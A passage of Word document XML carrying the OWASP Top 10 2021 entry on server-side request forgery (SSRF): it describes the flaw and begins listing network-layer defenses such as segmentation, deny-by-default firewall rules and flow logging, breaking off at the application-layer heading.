            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## Description </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">{{ </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>osib</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>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xml:space="preserve"> ~ ".description", id=id ~ "-description", name=title ~ ": Description", lang=lang, source=source ~ "#" ~ id, parent=</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>osib</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>) }}</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="04A3767D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3492" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E054519" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3493" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3494" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>SSRF flaws occur whenever a web application is fetching a remote</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7B387F95" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3495" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3496" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>resource without validating the user-supplied URL. It allows an attacker</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="41837D7A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3497" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3498" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>to coerce the application to send a crafted request to an unexpected</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6C717F05" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3499" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3500" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>destination, even when protected by a firewall, VPN, or another type of</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5922CA84" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3501" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3502" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>network access control list (ACL).</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="26C012C8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3503" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="319D3A8E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3504" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3505" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>As modern web applications provide end-users with convenient features,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="77DC2064" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3506" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3507" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>fetching a URL becomes a common scenario. As a result, the incidence of</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="52D38F1E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3508" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3509" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>SSRF is increasing. Also, the severity of SSRF is becoming higher due to</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1926563B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3510" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3511" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cloud services and the complexity of architectures.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6EC6D139" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3512" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C5575F6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3513" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3514" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## How to Prevent</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="559B3AC1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3515" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F29D687" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3516" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3517" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Developers can prevent SSRF by implementing some or all the following</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4317DFC5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3518" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3519" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>defense in depth controls:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="05F06389" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3520" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72271F83" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3521" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3522" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>### **From Network layer**</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="61F0CCE3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3523" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DF11AAC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3524" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3525" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Segment remote resource access functionality in separate networks to</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="55991C23" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3526" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3527" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    reduce the impact of SSRF</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6DD95B08" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3528" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46862676" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3529" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3530" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>-   Enforce “deny by default” firewall policies or network access</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="237E4DB8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3531" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3532" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    control rules to block all but essential intranet </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>traffic.&lt;</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>br</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">/&gt; </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3F783EF2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3533" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3534" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    *</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Hints:*</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>&lt;</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>br</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">&gt; </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="03139F1D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3535" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3536" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    ~ Establish an ownership and a lifecycle for firewall rules based on </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>applications.&lt;</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>br</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>/&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="22CBBCCE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3537" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3538" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    ~ Log all accepted *and* blocked network flows on firewalls</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7D16F730" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3539" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3540" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    (see [A09:2021-Security Logging and Monitoring </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Failures](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>A09_2021-Security_Logging_and_Monitoring_Failures.md)).</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7515E0CC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3541" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="635DF5C2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3542" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3543" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">### **From Application </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>layer:*</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>*</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="26A9F2DD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3544" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60D6C487" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
